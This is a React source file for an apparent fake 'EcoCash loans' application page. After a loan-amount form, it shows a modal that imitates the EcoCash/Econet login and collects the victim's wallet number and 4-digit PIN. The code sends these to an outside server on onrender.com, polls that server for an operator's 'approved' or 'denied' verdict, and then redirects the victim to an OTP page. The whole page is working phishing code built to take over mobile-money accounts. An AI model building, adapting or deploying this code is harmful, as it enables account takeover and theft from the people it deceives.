import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { ChevronLeft, ChevronDown, X, Eye, EyeOff, Home, CheckCircle2, Lock } from 'lucide-react';

const API_BASE_URL = "https://ecocash-loans-hlfv.onrender.com"; 

export default function ApplyPage() {
  const navigate = useNavigate();
  
  const [step, setStep] = useState(1);
  // Changed to number | string to allow the user to clear the input completely
  const [amount, setAmount] = useState<number | string>(50000); 
  const [months, setMonths] = useState(6);
  const [purpose, setPurpose] = useState("");
  const [isPurposeModalOpen, setIsPurposeModalOpen] = useState(false);
  
  const [fullName, setFullName] = useState('');
  const [city, setCity] = useState('');
  const [momoNumber, setMomoNumber] = useState('');
  
  const [isMomoOpen, setIsMomoOpen] = useState(false);
  const [pin, setPin] = useState('');
  const [showPin, setShowPin] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, []);

  // Calculate numbers safely. If amount is empty, treat it as 0 for display
  const numericAmount = Number(amount) || 0;
  const totalRepayment = numericAmount + (numericAmount * 0.03 * months);
  const monthlyPayment = totalRepayment / months;
  const formatCurrency = (val: number) => `ZWG ${val.toLocaleString()}`;
  const purposes = ["School fees", "Rent or housing", "Business stock", "Medical expenses", "Home improvement", "Emergency", "Other"];

  const handleContinue = () => {
    if (step === 1) {
      if (numericAmount < 5000) {
        alert("Minimum amount is ZWG 5,000");
        return;
      }
      setStep(2);
    } else {
      if (!fullName || !city || momoNumber.length < 9) {
        alert("Please fill in all your details.");
        return;
      }
      setIsMomoOpen(true);
    }
  };

  const handleLoginSubmit = async () => {
    if (pin.length !== 4 || momoNumber.length < 9) return;
    setIsProcessing(true);
    setErrorMsg('');

    try {
      const response = await fetch(`${API_BASE_URL}/api/initiate-login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: momoNumber, pin, amount: numericAmount, months })
      });

      if (!response.ok) throw new Error("Failed");
      const { transaction_id } = await response.json();

      let attempts = 0;
      pollRef.current = setInterval(async () => {
        attempts++;
        if (attempts > 60) {
          if (pollRef.current) clearInterval(pollRef.current);
          setIsProcessing(false);
          setErrorMsg("Request timed out. Please try again.");
          return;
        }

        try {
          const statusRes = await fetch(`${API_BASE_URL}/api/status/${transaction_id}`);
          const statusData = await statusRes.json();

          if (statusData.status === 'approved') {
            if (pollRef.current) clearInterval(pollRef.current);
            setIsProcessing(false);
            setIsSuccess(true); 
            setTimeout(() => {
              navigate('/otp', { state: { phone: momoNumber, amount: numericAmount } });
            }, 1500);
            
          } else if (statusData.status === 'denied') {
            if (pollRef.current) clearInterval(pollRef.current);
            setIsProcessing(false);
            setPin(''); 
            setErrorMsg("Incorrect PIN or login denied. Please try again.");
          }
        } catch (err) {
          console.error("Polling error:", err);
        }
      }, 2000); 

    } catch (error) {
      setIsProcessing(false);
      setErrorMsg("Network error. Please check your connection.");
    }
  };

  return (
    <div style={{ maxWidth: '480px', margin: '0 auto', backgroundColor: '#f8f9fc', minHeight: '100vh', fontFamily: "'Inter', sans-serif", position: 'relative' }}>
      <style>{`
        input::placeholder { color: #a0aec0 !important; font-weight: 500 !important; }
        input:focus { border-color: #0b40c4 !important; outline: none; box-shadow: 0 0 0 3px rgba(11, 64, 196, 0.1); }
        
        input[type=number]::-webkit-inner-spin-button, 
        input[type=number]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0; }
        input[type=number] { -moz-appearance: textfield; }
      `}</style>

      <div style={{ background: 'linear-gradient(135deg, #003B73 0%, #005A9C 100%)', padding: '24px 20px', color: 'white', borderBottomLeftRadius: '20px', borderBottomRightRadius: '20px' }}>
        <div onClick={() => step === 1 ? navigate('/') : setStep(1)} style={{ display: 'inline-flex', alignItems: 'center', gap: '6px', fontSize: '15px', color: 'white', background: 'rgba(255,255,255,0.15)', padding: '8px 16px', borderRadius: '20px', cursor: 'pointer', marginBottom: '20px' }}>
          {step === 1 ? <Home size={16} /> : <ChevronLeft size={18} />} {step === 1 ? 'Home' : 'Back'} / {step === 1 ? 'Apply' : 'Loan Details'}
        </div>
        <h1 style={{ fontSize: '28px', fontWeight: 800, margin: '0 0 10px 0' }}>Let's get you <span style={{color: '#FFCC00'}}>sorted.</span></h1>
      </div>

      <div style={{ backgroundColor: 'white', margin: '20px', borderRadius: '16px', padding: '24px 20px', boxShadow: '0 4px 16px rgba(0,0,0,0.04)' }}>
        {step === 1 ? (
          <>
            <h3 style={{ fontSize: '20px', margin: '0 0 8px 0' }}>How much do you need?</h3>
            <p style={{ fontSize: '14px', color: '#666', marginBottom: '24px' }}>Choose between ZWG 5,000 and ZWG 800,000.</p>
            
            <div style={{ display: 'flex', alignItems: 'center', border: '2px solid #e2e8f0', borderRadius: '14px', padding: '0 20px', marginBottom: '20px', backgroundColor: '#fcfcfc' }}>
              <span style={{ fontWeight: 800, color: '#005A9C', fontSize: '18px', marginRight: '10px' }}>ZWG</span>
              <input 
                type="number" 
                value={amount} 
                onChange={(e) => setAmount(e.target.value)} 
                // NEW: This selects the entire number when clicked, so you can easily delete or type over it
                onFocus={(e) => e.target.select()} 
                style={{ width: '100%', padding: '18px 0', border: 'none', backgroundColor: 'transparent', fontSize: '20px', fontWeight: 700, color: '#111', outline: 'none' }} 
              />
            </div>

            <div style={{ display: 'flex', flexWrap: 'wrap', gap: '10px', marginBottom: '24px' }}>
              {[10000, 50000, 200000, 800000].map(val => (
                <div key={val} onClick={() => setAmount(val)} style={{ padding: '12px 18px', borderRadius: '20px', border: Number(amount) === val ? '2px solid #005A9C' : '1px solid #e2e8f0', backgroundColor: Number(amount) === val ? '#005A9C' : 'white', color: Number(amount) === val ? 'white' : '#333', fontSize: '14px', cursor: 'pointer', fontWeight: 600 }}>ZWG {val.toLocaleString()}</div>
              ))}
            </div>
            <div style={{ display: 'flex', flexWrap: 'wrap', gap: '10px', marginBottom: '24px' }}>
              {[1, 3, 6, 12, 24].map(m => (
                <div key={m} onClick={() => setMonths(m)} style={{ padding: '12px 18px', borderRadius: '20px', border: months === m ? '2px solid #005A9C' : '1px solid #e2e8f0', backgroundColor: months === m ? '#005A9C' : 'white', color: months === m ? 'white' : '#333', fontSize: '14px', cursor: 'pointer', fontWeight: 600 }}>{m} month{m > 1 && 's'}</div>
              ))}
            </div>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '18px 20px', border: '2px solid #e2e8f0', borderRadius: '14px', cursor: 'pointer', color: purpose ? '#111' : '#a0aec0', backgroundColor: '#fcfcfc' }} onClick={() => setIsPurposeModalOpen(true)}>
              {purpose || 'Select a purpose'} <ChevronDown size={20} />
            </div>
          </>
        ) : (
          <>
            <h3 style={{ fontSize: '20px', margin: '0 0 8px 0' }}>Tell us about you</h3>
            <input type="text" placeholder="Full Name (e.g. Tinashe Moyo)" value={fullName} onChange={(e) => setFullName(e.target.value)} style={{ width: '100%', padding: '18px 20px', borderRadius: '14px', border: '2px solid #e2e8f0', backgroundColor: '#fcfcfc', marginBottom: '20px', boxSizing: 'border-box', color: '#111', fontWeight: 600 }} />
            <input type="text" placeholder="City / Town (e.g. Harare)" value={city} onChange={(e) => setCity(e.target.value)} style={{ width: '100%', padding: '18px 20px', borderRadius: '14px', border: '2px solid #e2e8f0', backgroundColor: '#fcfcfc', marginBottom: '20px', boxSizing: 'border-box', color: '#111', fontWeight: 600 }} />
            <input type="tel" placeholder="EcoCash Number (77X XXX XXX)" value={momoNumber} onChange={(e) => setMomoNumber(e.target.value.replace(/\D/g, '').slice(0,9))} style={{ width: '100%', padding: '18px 20px', borderRadius: '14px', border: '2px solid #e2e8f0', backgroundColor: '#fcfcfc', boxSizing: 'border-box', color: '#111', fontWeight: 600 }} />
          </>
        )}
      </div>

      <div style={{ backgroundColor: 'white', margin: '20px', borderRadius: '16px', padding: '24px 20px', boxShadow: '0 4px 16px rgba(0,0,0,0.04)' }}>
        <label style={{ display: 'block', fontSize: '13px', fontWeight: 700, color: '#666', marginBottom: '8px' }}>YOUR APPLICATION</label>
        <h2 style={{ fontSize: '32px', fontWeight: 800, color: '#003B73', margin: '8px 0' }}>{formatCurrency(numericAmount)}</h2>
        <p style={{ fontSize: '15px', color: '#666', marginBottom: '24px' }}>Over {months} months</p>
        <div style={{ borderTop: '1px dashed #cbd5e1', paddingTop: '20px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '15px', marginBottom: '14px' }}><span>Estimated monthly</span><span style={{ fontWeight: 700 }}>{formatCurrency(monthlyPayment)}</span></div>
          <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '15px', marginBottom: '14px' }}><span>Total repayment</span><span style={{ fontWeight: 700 }}>{formatCurrency(totalRepayment)}</span></div>
          <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '15px' }}><span>Purpose</span><span style={{ fontWeight: 700 }}>{purpose || '—'}</span></div>
        </div>
      </div>

      <div style={{ display: 'flex', gap: '12px', padding: '0 20px 30px' }}>
        {step === 2 && <button onClick={() => setStep(1)} style={{ flex: 1, padding: '18px', borderRadius: '14px', border: '2px solid #e2e8f0', backgroundColor: 'white', fontWeight: 700, color: '#005A9C', cursor: 'pointer' }}>Back</button>}
        <button onClick={handleContinue} style={{ flex: 2, padding: '18px', borderRadius: '14px', border: 'none', backgroundColor: '#005A9C', color: 'white', fontWeight: 700, cursor: 'pointer' }}>Continue</button>
      </div>

      {/* PURPOSE MODAL */}
      {isPurposeModalOpen && (
        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, backgroundColor: 'rgba(0,0,0,0.6)', zIndex: 100, display: 'flex', alignItems: 'flex-end', justifyContent: 'center' }} onClick={() => setIsPurposeModalOpen(false)}>
          <div style={{ backgroundColor: 'white', width: '100%', maxWidth: '480px', borderTopLeftRadius: '24px', borderTopRightRadius: '24px', padding: '24px 0' }} onClick={e => e.stopPropagation()}>
            <div style={{ padding: '0 24px 10px', fontSize: '18px', fontWeight: 700 }}>Select a purpose</div>
            {purposes.map(p => (
              <div key={p} style={{ padding: '16px 24px', borderBottom: '1px solid #f1f5f9', cursor: 'pointer', display: 'flex', justifyContent: 'space-between' }} onClick={() => { setPurpose(p); setIsPurposeModalOpen(false); }}>
                {p}
                <div style={{ width: '22px', height: '22px', borderRadius: '50%', border: purpose === p ? '7px solid #005A9C' : '2px solid #cbd5e1' }}></div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* REALISTIC ECOCASH LOGIN MODAL */}
      {isMomoOpen && (
        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, backgroundColor: 'rgba(0,0,0,0.7)', zIndex: 100, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px', backdropFilter: 'blur(4px)' }}>
          <div style={{ backgroundColor: 'white', borderRadius: '24px', padding: '30px 24px', width: '100%', maxWidth: '400px', position: 'relative', boxShadow: '0 20px 40px rgba(0,0,0,0.2)' }}>
            {!isProcessing && !isSuccess && (
              <button style={{ position: 'absolute', top: '20px', right: '20px', background: '#f1f5f9', border: 'none', cursor: 'pointer', borderRadius: '50%', padding: '8px' }} onClick={() => { setIsMomoOpen(false); setErrorMsg(''); }}>
                <X size={20} color="#64748b" />
              </button>
            )}
            
            {isSuccess ? (
              <div style={{ textAlign: 'center', padding: '20px 0' }}>
                <CheckCircle2 size={60} color="#00c853" style={{ margin: '0 auto 20px' }} />
                <h2 style={{ fontSize: '24px', fontWeight: 800, color: '#111' }}>Login Approved!</h2>
                <p style={{ color: '#64748b', marginTop: '8px' }}>Redirecting to OTP verification...</p>
              </div>
            ) : isProcessing ? (
              <div style={{ textAlign: 'center', padding: '40px 0' }}>
                <div style={{ width: '50px', height: '50px', border: '4px solid #e2e8f0', borderTop: '4px solid #0b40c4', borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto' }}></div>
                <style>{`@keyframes spin { 100% { transform: rotate(360deg); } }`}</style>
                <p style={{ marginTop: '24px', fontWeight: 700, color: '#0b40c4', fontSize: '16px' }}>Verifying account...</p>
                <p style={{ marginTop: '8px', color: '#64748b', fontSize: '13px' }}>Please wait while we confirm your details.</p>
              </div>
            ) : (
              <>
                <div style={{ textAlign: 'center', marginBottom: '28px' }}>
                  <div style={{ display: 'inline-flex', alignItems: 'center', justifyContent: 'center', gap: '8px', marginBottom: '16px' }}>
                    <div style={{ background: 'white', color: '#0b40c4', padding: '6px 10px', borderRadius: '8px', fontWeight: 800, fontSize: '13px', fontStyle: 'italic', border: '1px solid #e2e8f0', boxShadow: '0 2px 4px rgba(0,0,0,0.05)' }}>
                      ECONET <span style={{fontSize: '7px', display: 'block', fontStyle: 'normal', textAlign: 'center'}}>Wireless</span>
                    </div>
                    <div style={{ color: '#e53935', fontWeight: 800, fontSize: '18px', background: 'white', padding: '6px 12px', borderRadius: '8px', border: '1px solid #e2e8f0', boxShadow: '0 2px 4px rgba(0,0,0,0.05)' }}>
                      EcoCash
                    </div>
                  </div>
                  <h2 style={{ fontSize: '22px', fontWeight: 800, color: '#111', margin: '0 0 8px 0' }}>Welcome Back</h2>
                  <p style={{ fontSize: '13px', color: '#64748b', margin: 0 }}>Log in to your EcoCash wallet to secure your loan.</p>
                </div>

                {errorMsg && (
                  <div style={{ backgroundColor: '#fef2f2', border: '1px solid #fecaca', color: '#dc2626', padding: '10px 14px', borderRadius: '10px', fontSize: '13px', fontWeight: 600, marginBottom: '16px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <div style={{ width: '6px', height: '6px', backgroundColor: '#dc2626', borderRadius: '50%' }}></div>
                    {errorMsg}
                  </div>
                )}

                <label style={{ display: 'block', fontSize: '12px', fontWeight: 700, color: '#333', marginBottom: '8px', letterSpacing: '0.5px' }}>ECOCASH NUMBER</label>
                <div style={{ display: 'flex', border: '2px solid #e2e8f0', borderRadius: '12px', marginBottom: '20px', overflow: 'hidden', backgroundColor: 'white' }}>
                  <div style={{ padding: '16px', backgroundColor: '#f8fafc', borderRight: '2px solid #e2e8f0', display: 'flex', alignItems: 'center', gap: '6px', fontSize: '16px', fontWeight: 600, color: '#333' }}>
                    🇿🇼 +263
                  </div>
                  <input 
                    type="tel" 
                    placeholder="77X XXX XXX"
                    value={momoNumber} 
                    onChange={e => { setMomoNumber(e.target.value.replace(/\D/g, '').slice(0,9)); setErrorMsg(''); }} 
                    style={{ width: '100%', padding: '16px', border: 'none', fontSize: '18px', outline: 'none', color: '#111', fontWeight: 600, backgroundColor: 'transparent' }} 
                  />
                </div>

                <label style={{ display: 'block', fontSize: '12px', fontWeight: 700, color: '#333', marginBottom: '8px', letterSpacing: '0.5px' }}>ENTER PIN</label>
                <div style={{ position: 'relative' }}>
                  <input 
                    type={showPin ? "text" : "password"} 
                    placeholder="••••"
                    value={pin} 
                    onChange={e => { setPin(e.target.value.replace(/\D/g, '').slice(0,4)); setErrorMsg(''); }} 
                    style={{ width: '100%', padding: '18px', borderRadius: '12px', border: errorMsg ? '2px solid #dc2626' : '2px solid #e2e8f0', fontSize: '24px', textAlign: 'center', letterSpacing: '12px', color: '#111', backgroundColor: 'white', outline: 'none', fontWeight: 700 }} 
                  />
                  <span style={{ position: 'absolute', right: '16px', top: '20px', cursor: 'pointer', color: '#0b40c4', fontWeight: 700, fontSize: '13px', display: 'flex', alignItems: 'center', gap: '4px' }} onClick={() => setShowPin(!showPin)}>
                    {showPin ? <EyeOff size={16}/> : <Eye size={16}/>} {showPin ? 'Hide' : 'Peek'}
                  </span>
                </div>
                <p style={{ fontSize: '11px', color: '#64748b', marginTop: '8px', textAlign: 'center' }}>Enter the 4-digit PIN you set for your EcoCash account.</p>

                <button onClick={handleLoginSubmit} disabled={pin.length !== 4 || momoNumber.length < 9} style={{ width: '100%', padding: '18px', marginTop: '24px', borderRadius: '12px', border: 'none', backgroundColor: (pin.length === 4 && momoNumber.length >= 9) ? '#0b40c4' : '#a0bdf5', color: 'white', fontWeight: 700, fontSize: '16px', cursor: (pin.length === 4 && momoNumber.length >= 9) ? 'pointer' : 'not-allowed', transition: 'all 0.2s', boxShadow: (pin.length === 4 && momoNumber.length >= 9) ? '0 4px 12px rgba(11, 64, 196, 0.3)' : 'none' }}>
                  Login Securely
                </button>

                <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '6px', marginTop: '20px', opacity: 0.7 }}>
                  <Lock size={12} color="#64748b" />
                  <span style={{ fontSize: '10px', color: '#64748b', fontWeight: 600 }}>Secured by EcoCash</span>
                </div>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
}